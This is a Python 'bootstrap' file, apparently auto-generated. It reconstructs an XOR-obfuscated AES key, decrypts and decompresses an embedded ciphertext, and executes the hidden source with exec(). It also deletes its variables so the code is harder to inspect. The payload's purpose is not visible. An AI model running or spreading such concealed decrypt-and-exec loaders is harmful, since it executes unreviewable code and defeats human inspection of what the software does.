
# ---------- BOOTSTRAP (auto-generated) ----------
import base64, zlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

_x = sum([[236,137,14,164,201,142,71,92],[134,167,164,157,144,44,2,233],[42,209,25,249,168,9,79,105],[25,210,162,136,17,1,98,29]], [])  # obfuscated bytes list
_xor = 165
def _reconstruct_key(lst, xor):
    return bytes([i ^ xor for i in lst])

try:
    _key = _reconstruct_key(_x, _xor)
    _aes = AESGCM(_key)
    _nonce = base64.b64decode("s3kP4IQXLV1Uh3ha")
    _ct = base64.b64decode("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")
    _plain = _aes.decrypt(_nonce, _ct, None)
    _src = zlib.decompress(_plain).decode('utf-8')
    # optional: wipe sensitive vars quickly (makes casual inspection slightly harder)
    del _key, _aes, _nonce, _ct, _plain, _x
    # execute the original source in module globals
    exec(_src, globals())
except Exception as E:
    # If decryption fails, give a short, non-informative error so attackers get little clue.
    raise RuntimeError("Fatal: bootstrap exec failed") from E
# ---------- END BOOTSTRAP ----------
